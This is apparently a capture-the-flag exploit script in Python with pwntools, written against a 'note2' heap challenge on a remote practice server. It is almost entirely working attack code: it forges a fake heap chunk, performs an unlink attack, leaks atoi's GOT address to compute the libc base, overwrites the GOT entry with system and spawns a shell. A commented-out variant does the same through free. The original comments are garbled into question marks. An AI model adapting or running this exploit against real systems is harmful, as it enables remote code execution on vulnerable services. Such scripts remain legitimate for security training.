from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './note2'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28693) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b'>>',b'1')
    sla(b':',int2bytes(len))
    sla(b':',content)

def show(index):
    sla(b'>>',b'2')
    sla(b':',int2bytes(index))

def edit(index,choice,content):
    sla(b'>>',b'3')
    sla(b':',int2bytes(index))
    sla(b'[1.overwrite/2.append]',int2bytes(choice))
    sla(b':',content)

def delete(index):
    sla(b'>>',b'4')
    sla(b':',int2bytes(index))

#unlink
ptr = 0x602120

fd = ptr - 0x18
bk = ptr - 0x10
atoi_got = elf.got['atoi']
free_got = elf.got['free']

sla(b'name:',b'a')
sla(b'address:',b'b')

payload = p64(0) + p64(0xa1) #fake chunk ?????????0x20
payload += p64(fd) + p64(bk)
# edit(0, 1, payload)
add(0x80,payload) # 0 ????????????fake chunk
add(0x0,b'a') # 1 ?????????fake chunk??????
add(0x80,b'b') # 2

#???????????????chunk2??????chunk1????????????????????????????????????????????????????????????
delete(1)
payload = b'/bin/sh\x00' + p64(0) + p64(0xa0) + p64(0x90)
add(0x0,payload)# 1
delete(2)
#unlink ??????ptr = ptr - 0x18

#??????free_got,???????????????
# payload = b'a'*0x18+ p64(free_got)  #??????show?????????
# #??????ptr????????????1??????????????????????????????free_got???????????????1?????????????????????puts_got?????????2????????????
# #???????????????????????????????????????????????????free_got?????????puts_plt?????????????????????????????????????????????
# #?????????????????????????????????????????????free?????????????????????free(2)??????2??????2?????????????????????????????????puts_got??????leek
# edit(0, 1, payload)
#
#
# show(0)   #??????show?????????
# free_addr = uu64(ru('\x7f',drop=False)[-6:])
# log.success('free_addr: ',hex(free_addr))
# system_addr, bin_sh_addr = ret2libc(free_addr,'free')
#
# payload = p64(system_addr)
# #???free_got??????????????????1????????????????????????????????????system_addr
# edit(0, 1, payload)
#
# delete(3)#???????????????????????????????????????index=3????????????free?????????ptr???????????????????????????????????????????????????chunk3
# itr()
#


#??????atoi??????????????????
payload = b'a'*0x18+ p64(atoi_got)  #??????show?????????
#??????ptr????????????1??????????????????????????????free_got???????????????1?????????????????????puts_got?????????2????????????
#???????????????????????????????????????????????????free_got?????????puts_plt?????????????????????????????????????????????
#?????????????????????????????????????????????free?????????????????????free(2)??????2??????2?????????????????????????????????puts_got??????leek
edit(0, 1, payload)


show(0)   #??????show?????????
atoi_addr = uu64(ru('\x7f',drop=False)[-6:])
log.success('atoi_addr: ',hex(atoi_addr))
system_addr, bin_sh_addr = ret2libc(atoi_addr,'atoi')

payload = p64(system_addr)
#???free_got??????????????????1????????????????????????????????????system_addr
edit(0, 1, payload)
sla(b'>>', b'/bin/sh\x00')
itr()

